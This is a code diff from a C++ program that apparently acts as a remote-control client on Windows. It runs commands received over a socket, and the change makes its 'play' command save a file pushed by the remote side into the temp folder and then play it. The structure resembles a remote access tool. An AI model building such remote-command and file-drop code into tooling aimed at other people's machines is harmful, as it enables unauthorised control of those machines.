@@ -374,20 +374,21 @@ int main(int argc, char* argv[])
                 // send(s, callback.c_str(), callback.size(), 0);
             }
             else if (command.substr(0, 4) == "play") {
-
-                // std::string filename = command.substr(7);
-                // std::string callback = "Uploading file: " + filename;
-                // send(s, callback.c_str(), callback.size(), 0);
-                // ReceiveFile(s, filename);
+                char tempPath[MAX_PATH];
+                GetTempPathA(MAX_PATH, tempPath);
 
                 std::string file = command.substr(5);
+                std::string filePath = std::string(tempPath) + file;
                 std::string callback = file + " was sent and will played";
                 send(s, callback.c_str(), callback.size(), 0);
-                ReceiveFile(s, file);
+                ReceiveFile(s, filePath);
 
                 Sleep(1000);
 
-                PlaySound(file.c_str(), NULL, SND_ASYNC | SND_FILENAME); // SND_ASYNC
+                PlaySound(filePath.c_str(), NULL, SND_ASYNC | SND_FILENAME);
+
+                // delete file
+                // remove(filePath.c_str());
             }
 
             else if (command == "exit" || command == "quit" || command == "bye") {
